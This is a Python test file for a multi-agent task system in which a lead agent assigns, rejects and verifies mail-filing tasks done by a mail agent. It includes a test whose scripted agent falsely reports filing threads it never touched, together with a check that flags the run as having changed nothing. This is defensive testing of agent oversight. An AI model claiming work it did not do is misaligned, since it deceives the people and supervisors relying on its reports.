    report = {"task": 1, "action": "report", "outcome": "Moved 3 threads."}
    script.say(
        mail(),
        [ToolCall("r1", "team_close", report)],
        [ToolCall("r2", "team_close", {**report, "outcome": "Moved all 5 threads."})],
    )
    reject = {"task": 1, "action": "reject", "outcome": "Two PLM threads are still in the inbox"}
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("Given.")],
        [ToolCall("x", "team_close", {"task": 1, "action": "reject"})],
        [ToolCall("x1", "team_close", reject)],
        [TextChunk("Sent back.")],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "All there."})],
        [TextChunk("Done.")],
    )
    chat(client, session, "Go")
    wait(lambda: task_row(1)["state"] == "verified" or None, "verified", 30)
    assert "say what's wrong" in script.requests_text(lead(), 4)
    told = script.told(mail())
    assert len(told) == 2
    redo = script.requests_text(mail(), 2)
    assert "Your report was sent back: Two PLM threads are still in the inbox" in redo
    # A second reject is final.
    db = agent.current().db
    with db.transaction() as tx:
        tx.execute("UPDATE team_tasks SET state = 'reported' WHERE id = 1")
    giver = task_row(1)["assigner_session"]
    said = team.close(
        agent.current().ctx,
        session=giver,
        sender=task_row(1)["assigner"],
        task=1,
        action="reject",
        outcome="Still wrong",
        evidence=[],
    )
    assert said == "Task 1 rejected."
    assert task_row(1)["state"] == "rejected"


def test_an_answer_to_a_question_that_came_back_as_a_report_reaches_the_agent(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(
        mail(),
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Which folder?"})],
        [ToolCall("r2", "team_close", {"task": 1, "action": "report", "outcome": "Filed."})],
        [TextChunk("Reported.")],
    )
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("Given.")],
        [ToolCall("ans", "team_message", {"task": 1, "kind": "answer", "text": "PLM"})],
        [TextChunk("Answered.")],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "Seen."})],
        [TextChunk("Done.")],
    )
    chat(client, session, "Go")
    wait(lambda: task_row(1)["state"] == "verified" or None, "verified", 30)
    assert task_row(1)["outcome"] == "Filed."
    assert any("answer from" in t and "PLM" in t for t in script.told(mail()))


def test_a_report_to_a_closed_chat_carries_on_in_a_new_one(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    waiting, go_on = script.hold(mail(), 1)
    script.say(
        mail(), [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Filed."})]
    )
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("Given.")],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "Seen."})],
        [TextChunk("Done.")],
    )
    chat(client, session, "Go")
    assert waiting.wait(15), "the task never started"
    post(client, "session.archive", {"id": session})
    go_on.set()
    wait(lambda: task_row(1)["state"] == "verified" or None, "verified", 30)
    assert task_row(1)["assigner_session"] != session
    wait(
        lambda: any(
            "has news on task 1" in n["title"] for n in post(client, "notifications.list")["items"]
        ),
        "the person told",
    )


def test_canceling_a_task_ends_the_run_doing_it(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("Given.")])
    script.say(
        mail(),
        [ToolCall("l", "list_categories", {})],
        [ToolCall("l2", "list_categories", {})],
        [ToolCall("l3", "list_categories", {})],
    )
    waiting, go_on = script.hold(mail(), 2)
    chat(client, session, "Go")
    assert waiting.wait(15)
    post(client, "team.cancel", {"id": 1})
    go_on.set()
    owner = task_row(1)["owner_session"]
    db = agent.current().db
    wait(
        lambda: (
            db.fetch_all("SELECT 1 FROM agent_turns WHERE session = ? AND closed = 1", (owner,))
            or None
        ),
        "run ended",
        20,
    )
    # The step under way finishes, and nothing after it.
    assert len(script.told(mail())) == 2


def test_an_answer_reaches_a_run_that_is_still_going(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("Given.")])
    script.say(
        mail(),
        [ToolCall("l", "list_categories", {})],
        [ToolCall("l2", "list_categories", {})],
        [TextChunk("ok")],
    )
    waiting, go_on = script.hold(mail(), 2)
    chat(client, session, "Go")
    assert waiting.wait(15)
    db = agent.current().db
    with db.transaction() as tx:
        team._message(tx, 1, "answer", "session", "mail", "Use PLM", False)
    go_on.set()
    # Delivered before its next step, not held until a run that may never come.
    third = wait(
        lambda: [t for t in script.told(mail()) if "answer from" in t] or None, "delivered", 20
    )
    assert "Use PLM" in third[0]


def test_a_loop_pause_tells_the_person_and_the_giver(client: TestClient) -> None:
    db = agent.current().db
    ctx = agent.current().ctx
    session = post(client, "session.create")["id"]
    with db.transaction() as tx:
        tx.execute(
            "INSERT INTO team_tasks (id, objective, expected_output, done_criteria, refs, evidence,"
            " assigner, assigner_session, owner, state, budget_tokens, created, updated)"
            " VALUES (9, 'x', 'x', 'x', '[]', '[]', ?, ?, 'mail', 'input_required', 1000, ?, ?)",
            (cards.default(db).id, session, "2030-01-01", "2030-01-01"),
        )
    team._pause_for_loop(ctx, task_row(9))
    assert task_row(9)["state"] == "blocked" and task_row(9)["wake"] == team.ASSIGNER


def test_a_call_for_another_agents_tool_shows_why_it_didnt_run(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    brief = {"sections": []}
    script.say(lead(), [ToolCall("r", "update_brief", brief)], [TextChunk("Handing it on.")])
    chat(client, session, "Put the budget first in my brief")
    shown = post(client, "session.get", {"id": session})["messages"][-1]["parts"]
    call = next(p for p in shown if p["type"] == "tool-update_brief")
    # Turned away before it ran, it still says why, instead of looking like it's working.
    assert call["state"] == "output-available"
    brief_at = cards.card(agent.current().db, "daily-prep").at  # type: ignore[union-attr]
    assert call["output"].startswith("Not run") and brief_at in call["output"]


def test_a_task_shows_the_steps_of_the_agent_doing_it(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(
        mail(),
        [ToolCall("i", "team_inbox", {})],
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Filed."})],
    )
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("Given.")])
    chat(client, session, "Go")
    wait(lambda: task_row(1)["state"] != "queued" and task_row(1)["state"] != "working" or None)
    steps = post(client, "team.task", {"id": 1})["steps"]
    assert [s["tool"] for s in steps] == ["team_inbox", "team_close"]
    assert steps[1]["input"]["action"] == "report"


def test_a_report_from_a_run_that_changed_nothing_says_so(
    client: TestClient, script: TeamScript
) -> None:
    """A weak model can report work it never did. The giver is told the run changed nothing, so
    the claim isn't verified on its word."""
    session = post(client, "session.create")["id"]
    report = {"task": 1, "action": "report", "outcome": "Filed every PLM thread."}
    script.say(
        mail(),
        [ToolCall("l", "list_categories", {})],
        [ToolCall("r", "team_close", report)],
        [TextChunk("Reported.")],
    )
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("Given.")])
    chat(client, session, "File last week's PLM mail")
    woken = wait(
        lambda: [t for t in script.told(lead()) if "reported task 1" in t] or None, "report", 20
    )[0]
    assert "Its run changed nothing" in woken
    turns = agent.current().db.fetch_all(
        "SELECT versions FROM agent_turns WHERE versions IS NOT NULL ORDER BY id"
    )
    plugins_used = {json.loads(t["versions"]).get("plugin") for t in turns}
    # Each run records which plugin its agent came from.
    assert {"nexusai", "mail"} <= plugins_used
